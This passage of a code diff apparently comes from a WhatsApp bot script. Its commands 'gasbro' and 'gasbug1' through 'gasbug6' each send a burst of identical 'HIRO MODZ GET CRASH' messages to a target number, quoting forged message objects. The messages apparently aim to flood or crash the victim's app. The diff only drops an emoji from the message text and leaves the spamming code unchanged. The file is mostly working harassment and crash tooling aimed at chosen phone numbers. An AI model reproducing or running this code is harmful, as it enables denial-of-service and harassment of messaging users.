-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fkon})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fkon})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fkon})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fkon})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fkon})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fkon})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fkon})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fkon})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fkon})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fkon})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fkon})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fkon})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fkon})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fkon})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fkon})
 await m.reply(`Succes`)
 break
 case 'gasbro':
@@ -5721,21 +5721,21 @@ participant: `0@s.whatsapp.net`,
 }
 }
 }
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:finv})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:finv})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:finv})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:finv})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:finv})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:finv})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:finv})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:finv})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:finv})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:finv})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:finv})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:finv})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:finv})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:finv})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:finv})
 await m.reply(`Succes`)
 break
 case 'gasbug1':
@@ -5752,26 +5752,26 @@ jpegThumbnail: fs.readFileSync(`./pict.jpg`),
 }
 }
 } 
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc1})
 await m.reply(`Succes`)
 break
 case 'gasbug2':
@@ -5791,26 +5791,26 @@ message: {
 } 
 } 
 }
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:foto1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foto1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:foto1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foto1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:foto1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foto1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:foto1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foto1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:foto1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foto1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:foto1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foto1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:foto1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foto1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:foto1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foto1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:foto1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foto1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:foto1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foto1})
 await m.reply(`Succes`)
 break
 case 'gasbug3':
@@ -5830,26 +5830,26 @@ message: {
 }
 } 
 }
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc1})
 await m.reply(`Succes`)
 break
 case 'gasbug4':
@@ -5869,26 +5869,26 @@ message: { "videoMessage": {
 }
 }
 }
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fgif1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgif1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fgif1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgif1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fgif1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgif1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fgif1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgif1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fgif1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgif1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fgif1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgif1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fgif1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgif1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fgif1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgif1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fgif1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgif1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fgif1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgif1})
 await m.reply(`Succes`)
 break 
 case 'gasbug5':
@@ -5905,26 +5905,26 @@ jpegThumbnail: fs.readFileSync(`./pict.jpg`),
 }
 }
 }
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:floc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:floc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:floc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:floc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:floc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:floc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:floc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:floc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:floc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:floc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:floc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:floc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:floc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:floc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:floc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:floc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:floc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:floc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:floc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:floc1})
 await m.reply(`Succes`)
 break
 case 'gasbug6':
@@ -5948,26 +5948,26 @@ message: {
 "retailerId": "© Hiro Modz", 
 "productImageCount": 1}, 
 "businessOwnerJid": `6285737134572@s.whatsapp.net`}}}
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko1})
